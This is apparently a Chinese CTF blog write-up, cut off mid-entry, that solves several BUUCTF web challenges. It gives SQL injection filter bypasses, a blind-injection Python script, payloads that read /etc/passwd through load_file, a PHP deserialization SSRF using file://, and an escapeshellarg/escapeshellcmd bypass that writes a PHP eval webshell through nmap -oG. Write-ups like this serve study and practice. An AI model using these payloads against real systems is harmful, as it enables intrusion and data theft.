class="hljs-keyword">SET</span> @<span class="hljs-keyword">sql</span> = <span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;select * from &#x27;</span>, @tn);  //存储SQL语句<span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> @<span class="hljs-keyword">sql</span>;   //预定义SQL语句<span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">name</span>;  //执行预定义SQL语句(<span class="hljs-keyword">DEALLOCATE</span> || <span class="hljs-keyword">DROP</span>) <span class="hljs-keyword">PREPARE</span> sqla;  //删除预定义SQL语句（可以不用）</code></pre><p>2.select被过滤的姿势</p><pre><code class="hljs lsl">大小写绕过、&lt;&gt;、双写、%<span class="hljs-number">0</span>a、%<span class="hljs-number">0</span>d、/！**/利用char函数，select——char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>)<span class="hljs-number">1</span>&#x27;;PREPARE jwt from concat(char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>), &#x27; * from `<span class="hljs-number">1919810931114514</span>` &#x27;);EXECUTE jwt;#可以拼接<span class="hljs-number">1</span>&#x27;;set @a=concat(<span class="hljs-string">&quot;sel&quot;</span>,<span class="hljs-string">&quot;ect flag from 1919810931114514&quot;</span>);prepare hello from @a;execute hello;# 用handler代替，handler直接读表的一行数据<span class="hljs-number">1</span>&#x27;;handler `<span class="hljs-number">1919810931114514</span>` open as a;handler a read first;handler a close;#  <span class="hljs-comment">//注意：这里有的题必须close handler才可以获取Flag</span>或利用十六进制编码绕过set @a=concat(<span class="hljs-string">&quot;sel&quot;</span>,<span class="hljs-string">&quot;ect flag from `1919810931114514`&quot;</span>); <span class="hljs-comment">//或者将select * from ` 1919810931114514 `进行16进制编码</span><span class="hljs-comment">//@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>prepare hello from @a；execute hello;</code></pre><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h4 id="考点：盲注只回显true-flase、python脚本判断字符爆flag"><a href="#考点：盲注只回显true-flase、python脚本判断字符爆flag" class="headerlink" title="考点：盲注只回显true/flase、python脚本判断字符爆flag"></a>考点：盲注只回显true/flase、python脚本判断字符爆flag</h4><p>思路：输入框测试发现回显bool(false)、无报错，对关键词敏感，但是发现输入4/2对应输出2的内容——说明有逻辑判断，尝试if语句，成功——写脚本爆出flag</p><blockquote><p><a href="https://inanb.github.io/2021/01/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/">参考WP</a></p></blockquote><pre><code class="hljs lsl">输入<span class="hljs-number">1</span>回显Hello, glzjin wants a girlfriend.输入<span class="hljs-number">2</span>回显Do you want to be my girlfriend?输入‘回显**bool(false)**输入<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span> ,SQL Injection Checked.输入&#x27;%<span class="hljs-number">23</span>，SQL Injection Checked.<span class="hljs-number">4</span>/<span class="hljs-number">2</span>——Do you want to be my girlfriend?只有两个数据，输入<span class="hljs-number">3</span>及以上就返回Error Occured When Fetch Result.</code></pre><p><strong>但是好多字符包括空格都给过滤了</strong></p><p>但是：1/1、4/2是可以出结果的，也就是说，可以借助<strong>逻辑判断</strong>返回1和0，判断逻辑的真假。</p><blockquote><p>if类似三目运算<br>if(条件,expr2,expr3)，如果条件为true,则返回expr2的值，否则返回3</p></blockquote><p>布尔盲注：只返回true/false</p><p>空格被过滤：利用（）</p><pre><code class="hljs subunit">id=if(length((select(flag)from(flag)))=42,1,0)Hello, glzjin wants a girlfriend.id=if(length((select(flag)from(flag)))=43,1,0)<span class="hljs-keyword">Error </span>Occured When Fetch Result.</code></pre><p>说明flag长度是42</p><h4 id="GUID"><a href="#GUID" class="headerlink" title="GUID"></a>GUID</h4><p>什么是 GUID？又叫uuid（通用标识符）</p><ul><li><p>全球唯一标识符 (GUID) 是一个字母数字标识符，用于指示产品的唯一性安装。在许多流行软件应用程序（例如 Web 浏览器和媒体播放器）中，都使用 GUID。</p></li><li><p>GUID 的格式为“xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx”，其中每个 x 是 0-9 或 a-f 范围内的一个十六进制的数字。例如：6F9619FF-8B86-D011-B42D-00C04FC964FF 即为有效的 GUID 值</p></li><li><p>{CAF53C68-A94C-11D2-BB4A-00C04FA330A6}</p></li></ul><p> 先写出一个核心的语句，判断flag的第一个字符是否ascii码为101</p><pre><code class="hljs angelscript"><span class="hljs-keyword">if</span>((ascii(substr((select(flag)<span class="hljs-keyword">from</span>(flag)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span>),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)ASCII <span class="hljs-number">101</span> :eDo you want to be my girlfriend?  <span class="hljs-comment">//说明不是e</span></code></pre><p>然后放到burp里爆出第一个字符是f，ASCII为102</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313112559474.png" alt="image-20220313112559474" style="zoom:67%;"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> timeurl = <span class="hljs-string">&#x27;http://9a1163f4-44f5-4def-9fca-a0c669acfeae.node4.buuoj.cn:81/index.php&#x27;</span>flag=<span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">43</span>):    l = <span class="hljs-number">32</span>    r = <span class="hljs-number">126</span>    <span class="hljs-keyword">while</span> r &gt; l:        mid = <span class="hljs-built_in">int</span>((l+r+<span class="hljs-number">1</span>) / <span class="hljs-number">2</span>)        x = <span class="hljs-built_in">str</span>(x)        y = <span class="hljs-built_in">str</span>(mid)        <span class="hljs-built_in">id</span> = &#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&#x27;if(ascii(substr((select(flag)from(flag)),&#x27;</span>+x+<span class="hljs-string">&#x27;,1))&gt;=&#x27;</span>+y+<span class="hljs-string">&#x27;,1,0)&#x27;</span>&#125;  <span class="hljs-comment">#python字符串拼接用+</span>        response = requests.post(url=url,data=<span class="hljs-built_in">id</span>)        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> response.text:            l = mid        <span class="hljs-keyword">else</span>:            r = mid<span class="hljs-number">-1</span>        time.sleep(<span class="hljs-number">0.03</span>)  <span class="hljs-comment">#延时处理防止频繁访问导致网页不正常回显产生坏点（得益于sql延时注入了解了sleep函数）</span>    flag+=(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(r)))    print(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(r)))print(flag)</code></pre><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h4 id="考点：SQL注入、反序列化-curl-exec、SSRF"><a href="#考点：SQL注入、反序列化-curl-exec、SSRF" class="headerlink" title="考点：SQL注入、反序列化+curl_exec、SSRF"></a>考点：SQL注入、反序列化+curl_exec、SSRF</h4><p>访问tobots.txt，得到备份文件</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313134519393.png" alt="image-20220313134519393"></p><p>访问/user.php.bak，下载备份文件，得到php代码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name, $age, $blog</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = $name;        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)$age;        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$url</span>)</span><span class="hljs-function">    </span>&#123;        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);        $output = curl_exec($ch);   <span class="hljs-comment">//注意！SSRF</span>        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;        &#125;        curl_close($ch);        <span class="hljs-keyword">return</span> $output;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $blog = <span class="hljs-keyword">$this</span>-&gt;blog;        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);    &#125;&#125;</code></pre><p>get方法中，<strong>curl_exec()如果使用不当就会导致ssrf漏洞</strong>。有一点思路了，而我们在御剑扫到了flag.php（我没扫到，猜测跟index.php在同一目录）。猜测可能flag.php处于内网，</p><p>如果用ssrf访问flag.php，可以==用伪协议file://var/www/html/flag.php访问。==</p><ol><li>随便注册一个用户abd,密码123，age11，blog:<a href="https://www.baidu.com,访问注册的用户,发现返回刚刚注册的内容,blog是输入的www.baidu.com/">https://www.baidu.com，访问注册的用户，发现返回刚刚注册的内容，blog是输入的www.baidu.com</a></li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313152014417.png" alt="image-20220313152014417"></p><ol start="2"><li>然后下面的content查看源码，解码发现是<a href="http://www.baidu.com的首页内容==》**有思路了**,blog用file//%E8%AF%BB%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%EF%BC%8C%E4%B8%8B%E9%9D%A2%E7%9A%84content%E5%9B%9E%E6%98%BEbase64%E7%9A%84%E6%96%87%E4%BB%B6%E6%BA%90%E7%A0%81%EF%BC%8C%E5%88%A9%E7%94%A8ssrf%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%9C%AC%E5%9C%B0%E6%BA%90%E7%A0%81">www.baidu.com的首页内容==》**有思路了**，blog用file://读本地文件，下面的content回显base64的文件源码，利用ssrf伪协议读本地源码</a></li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313152050715.png" alt="image-20220313152050715"></p><ol start="3"><li><p>但是直接注册用户，blog那里有严格的preg过滤：<strong>所以想在这个位置运用file协议不行</strong></p></li><li><p>注册用户后，访问用户时发现url里有<strong>参数no，尝试修改，发现注入点，但也有waf</strong></p></li></ol><pre><code class="hljs pgsql">/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>%<span class="hljs-number">20</span><span class="hljs-keyword">order</span>%<span class="hljs-number">20</span><span class="hljs-keyword">by</span>%<span class="hljs-number">205</span>   //  [*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;5&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;order clause&#x27;</span>)——<span class="hljs-number">4</span>列/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>%<span class="hljs-number">27</span><span class="hljs-keyword">union</span>%<span class="hljs-number">20</span><span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">23</span>  //<span class="hljs-keyword">no</span> hack ~_~/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^updatexml   //[*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;updatexml&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;where clause&#x27;</span>)/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(flag)<span class="hljs-keyword">from</span>(information_schema.schemata)))=<span class="hljs-number">42</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)  //[*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;field list&#x27;</span>)   //information_schema.schemata 所有库名/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(passwd)<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)))=<span class="hljs-number">42</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)//information_schema.<span class="hljs-keyword">tables</span>：所有表集合，<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(passwd)<span class="hljs-keyword">from</span>(users)))=<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)，爆出<span class="hljs-keyword">password</span>长度：<span class="hljs-number">128</span>   //太麻烦了，卡壳，不知道咋读表、列名了</code></pre><ol start="5"><li>查看WP发现unionselect被过滤，而且只对他俩中间得空格过滤——==中间加/**/即可绕过==</li></ol><pre><code class="hljs crystal"> ?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">user</span>(),3,4--+　　　　//数据库信息</span>root@localhost  ==》root权限，可以sql读文件</code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313144801377.png" alt="image-20220313144801377" style="zoom: 50%;"><h4 id="法1：SQL注入root直接读本地文件"><a href="#法1：SQL注入root直接读本地文件" class="headerlink" title="法1：SQL注入root直接读本地文件"></a>法1：SQL注入root直接读本地文件</h4><p>secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下：</p><ul><li><p>无内容，表示无限制。</p></li><li><p>为NULL，表示禁止文件读/写。</p></li><li><p>为目录名，表示仅允许对特定目录的文件进行读/写。</p></li><li><p>三种方法查看当前<code>secure-file-priv</code>的值：</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @@secure_file_priv;<span class="hljs-keyword">select</span> @@global.secure_file_priv;<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;secure_file_priv&quot;</span>;</code></pre></li></ul><p>读文件：</p><ul><li><p>Mysql读取文件通常使用load_file函数，语法如下：【==限制：secure-file-priv无值（root）、绝对路径、文件必须在服务器上==】</p></li><li><pre><code>select load_file(file_path);<pre><code class="hljs sql">- ```  <span class="hljs-keyword">load</span> <span class="hljs-keyword">data</span> <span class="hljs-keyword">infile</span> <span class="hljs-string">&quot;/etc/passwd&quot;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">test</span> <span class="hljs-keyword">FIELDS</span> <span class="hljs-keyword">TERMINATED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;\n&#x27;</span>; <span class="hljs-comment">#读取服务端文件</span></code></pre></code></pre></li></ul><pre><code class="hljs crystal">-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,@@<span class="hljs-title">secure_file_priv</span>,3,4--+    //回显空--说明无限制</span>/view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">load_file</span>(&#x27;/<span class="hljs-title">etc</span>/<span class="hljs-title">passwd</span>&#x27;),3,4--+   成功读到系统文件</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313145336505.png" alt="image-20220313145336505"></p><p>payload：==注意！flag在源码==</p><pre><code class="hljs crystal">view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">load_file</span>(&#x27;/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>/<span class="hljs-title">html</span>/<span class="hljs-title">flag</span>.<span class="hljs-title">php</span>&#x27;),3,4--+</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313145628120.png" alt="image-20220313145628120"></p><h4 id="法2：反序列化-SSRF读本地文件"><a href="#法2：反序列化-SSRF读本地文件" class="headerlink" title="法2：反序列化+SSRF读本地文件"></a>法2：反序列化+SSRF读本地文件</h4><p>继续注入，已知表是facebook</p><p>爆当前库下所有表名：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+   错！，回显位置在中间时，from应该在select所有的后面</span><span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+   //users表</span></code></pre><p>爆users表列名：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><span class="hljs-keyword">no</span>,username,passwd,data,<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></pre><p>爆字段：</p><pre><code class="hljs crystal">view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">concat_ws</span>(&#x27;--&#x27;,<span class="hljs-title">no</span>,<span class="hljs-title">username</span>,<span class="hljs-title">passwd</span>,<span class="hljs-title">data</span>),3,4 <span class="hljs-title">from</span> <span class="hljs-title">users</span>--+</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313150748223.png" alt="image-20220313150748223"></p><ul><li>然后注意注入时一直都有的报错，大概意思是unserialize没有读取到参数</li></ul><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313151150653.png" alt="image-20220313151150653"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313151308157.png" alt="image-20220313151308157"></p><ul><li>这个data就是序列化后的字符串，与一开始得到的源码有关联了，<strong>因为页面提示了我们反序列化，所以猜测no参数的值代入数据库查询之后还会被反序列化一次，这个时候就会导致blog变异，读任意文件</strong></li></ul><p>尝试把序列化字符传入不同位置，发现在4的位置成功读取序列化字符串，并反序列化返回<a href="http://www.baidu.com的base64内容/">www.baidu.com的base64内容</a></p><p>构造payload读取flag:</p><pre><code class="hljs css">一开始：<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:&quot;UserInfo&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">11</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>;&#125;构造：<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:&quot;UserInfo&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">11</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;</code></pre><p>成功读到base64，解码得到flag</p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>考点：escapeshellarg()和escapeshellcmd()这个点，外加一个nmap的文件写入。</p><blockquote><p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">参考WP1</a></p><p><a href="https://blog.csdn.net/qq_52907838/article/details/119115412?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&spm=1001.2101.3001.4242.1&utm_relevant_index=1">参考WP2</a></p></blockquote><p>点进去得到源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;    $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];&#125;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125; <span class="hljs-keyword">else</span> &#123;    $host = $_GET[<span class="hljs-string">&#x27;host&#x27;</span>];    $host = escapeshellarg($host);  <span class="hljs-comment">//对参数host过滤了</span>    $host = escapeshellcmd($host);    $sandbox = md5(<span class="hljs-string">&quot;glzjin&quot;</span>. $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.$sandbox;    @mkdir($sandbox);    chdir($sandbox);    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);&#125;</code></pre><p>REMOTE_ADDR不能伪造，然后这里也不能产生影响</p><p><strong>escapeshellarg</strong>本以为是自定义函数，但发现不是，是官方函数，防注入的，但可以绕过</p><blockquote><p><strong>应用使用</strong><code>escapeshellarg -&gt; escapeshellcmd</code><strong>这样的流程来处理输入是存在隐患的</strong></p></blockquote><pre><code class="hljs lsl"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&#x27; -v -d a=<span class="hljs-number">1</span>经过escapeshellarg()函数处理后变为： &#x27;<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&#x27;\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>&#x27;也就是将其中的&#x27;单引号转义，再将左右两部分用单引号括起来从而起到连接的作用，这样左右就形成闭合，命令就被当作简单的字符串。接着经过escapeshellcmd()函数处理后变成：&#x27;<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>&#x27;\\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>\&#x27;也就是说对\以及最后那个不配对儿的引号进行了转义执行的命令是curl &#x27;<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>&#x27;\\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。所以可以简化为curl <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>\ -v -d a=<span class="hljs-number">1</span>&#x27;，即向<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>\发起请求，POST 数据为a=<span class="hljs-number">1</span>&#x27;。</code></pre><h4 id="namp写webshell"><a href="#namp写webshell" class="headerlink" title="namp写webshell"></a>namp写webshell</h4><p>其中参数<span style="background:#FF9999;"><code>-oG</code>可以实现将命令和结果写入文件，其格式为：内容 -oG 文件名称</span></p><pre><code class="hljs diff">Nmap的一些参数：<span class="hljs-deletion">-oN 标准保存</span><span class="hljs-deletion">-oX XML保存</span><span class="hljs-deletion">-oG Grep保存</span><span class="hljs-deletion">-oA 保存到所有格式</span><span class="hljs-deletion">-append-output 补充保存文件</span></code></pre><p>构造</p><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> | <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[hack]);<span class="hljs-meta">?&gt;</span> -oG shell.php</code></pre><p>但这样会被escapeshellarg()与escapeshellcmd()函数处理为：</p><pre><code class="hljs taggerscript">&#x27;127.0.0.1 | <span class="hljs-symbol">\&lt;</span><span class="hljs-symbol">\?</span>php @eval<span class="hljs-symbol">\(</span><span class="hljs-symbol">\)</span><span class="hljs-symbol">\;</span><span class="hljs-symbol">\?</span><span class="hljs-symbol">\&gt;</span> -oG hack.php&#x27;</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>陇剑杯部分WP</title>
    <link href="/2021/12/09/%E9%99%87%E5%89%91%E6%9D%AF%E9%83%A8%E5%88%86WP/"/>
    <url>/2021/12/09/%E9%99%87%E5%89%91%E6%9D%AF%E9%83%A8%E5%88%86WP/</url>
    
    <content type="html"><![CDATA[<p>流量杯了属实是，web手初试流量分析orz，学到很多。。。</p><h2 id="🔗流量分析"><a href="#🔗流量分析" class="headerlink" title="🔗流量分析"></a>🔗流量分析</h2><blockquote><p><a href="https://jwt1399.top/posts/29176.html#toc-heading-17">CTF流量分析题目总结</a></p><p><a href="https://blkstone.github.io/2017/11/09/wireshark-basic/">CTF视角的wireshark基础</a></p></blockquote><h2 id="🔗内存取证"><a href="#🔗内存取证" class="headerlink" title="🔗内存取证"></a>🔗内存取证</h2><blockquote><p>​    <a href="https://r0fus0d.blog.ffffffff0x.com/post/memory_forensics/">总结</a></p></blockquote><h2 id="WP参考"><a href="#WP参考" class="headerlink" title="WP参考"></a>WP参考</h2><blockquote><p><a href="http://www.snowywar.top/?p=2554">魔法少女</a></p><p><a href="https://www.xl-bit.cn/index.php/archives/724/">bit师傅</a></p></blockquote><h2 id="🔧工具"><a href="#🔧工具" class="headerlink" title="🔧工具"></a>🔧工具</h2><blockquote><p><a href="https://chef.miaotony.xyz/">bake工具</a></p><p><a href="https://www.sqlsec.com/2019/10/hashcat.html">密码爆破神器–Hashcat【kali自带】</a></p><p><a href="https://crackstation.net/">国外在线hash解密</a></p><p><a href="https://jwt.io/">JWT在线加解密</a></p><p><a 